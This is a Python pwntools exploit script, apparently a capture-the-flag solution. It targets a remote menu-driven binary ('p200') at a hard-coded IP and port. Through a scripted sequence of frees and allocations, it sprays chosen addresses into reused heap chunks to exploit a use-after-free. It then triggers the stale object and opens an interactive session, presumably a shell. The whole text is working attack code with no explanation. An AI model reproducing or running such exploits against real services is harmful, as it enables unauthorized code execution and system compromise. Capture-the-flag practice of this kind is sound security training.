from pwn import*
# context.log_level = 'debug'
# p = process('./p200')
addr = 0x0000000000602D70
addr2 = 0x602D58

p = remote('106.75.8.58',12333)

p.recvuntil('1. use, 2. after, 3. free\n')
p.sendline('3')

p.recvuntil('1. use, 2. after, 3. free\n')
p.sendline('2')
p.recvuntil('Please input the length:\n')
p.sendline(str(32))
p.sendline(p64(addr2).ljust(32, '\x00'))

p.recvuntil('1. use, 2. after, 3. free\n')
p.sendline('2')
p.recvuntil('Please input the length:\n')
p.sendline(str(32))
p.sendline(p64(addr2).ljust(32, '\x00'))

p.recvuntil('1. use, 2. after, 3. free\n')
p.sendline('3')

p.recvuntil('1. use, 2. after, 3. free\n')
p.sendline('2')
p.recvuntil('Please input the length:\n')
p.sendline(str(0x30))
p.sendline(p64(addr).ljust(0x30, '\x00'))

p.recvuntil('1. use, 2. after, 3. free\n')
p.sendline('2')
p.recvuntil('Please input the length:\n')
p.sendline(str(0x30))
p.sendline(p64(addr).ljust(0x30, '\x00'))

p.recvuntil('1. use, 2. after, 3. free\n')
p.sendline('1')

p.interactive()